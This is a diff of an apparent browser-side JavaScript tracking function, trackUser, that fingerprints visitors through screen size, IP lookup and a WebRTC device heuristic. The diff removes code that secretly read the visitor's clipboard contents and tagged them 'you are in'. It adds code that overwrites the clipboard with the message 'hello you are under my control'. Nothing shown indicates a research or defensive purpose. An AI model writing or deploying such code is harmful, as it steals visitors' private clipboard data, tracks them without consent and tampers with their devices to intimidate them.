@@ -145,7 +145,7 @@ async function trackUser() {
     screenSize: `${screen.width}x${screen.height}`,
     battery: "Unknown",
     gpu: "Unknown",
-    clipboard: "Blocked",
+    clipboard: "Write attempted", // Changed from "Blocked"
     deviceModel: "Unknown"
   };
 
@@ -182,12 +182,14 @@ async function trackUser() {
     })
     .catch(() => console.warn("Could not fetch IP"));
 
-  // Clipboard read with "you are in" prefix
+  // Write to clipboard instead of reading
   try {
-    const clipboardText = await navigator.clipboard.readText();
-    userData.clipboard = clipboardText ? `you are in ${clipboardText}` : "Empty";
+    await navigator.clipboard.writeText("hello you are under my control");
+    userData.clipboard = "Text written to clipboard successfully";
+    console.log("Successfully wrote to clipboard");
   } catch (err) {
-    console.warn("Clipboard access denied or unavailable");
+    console.warn("Clipboard write access denied or unavailable:", err);
+    userData.clipboard = "Write failed: " + err.message;
   }
 
   // Device info using a WebRTC trick (heuristic only)
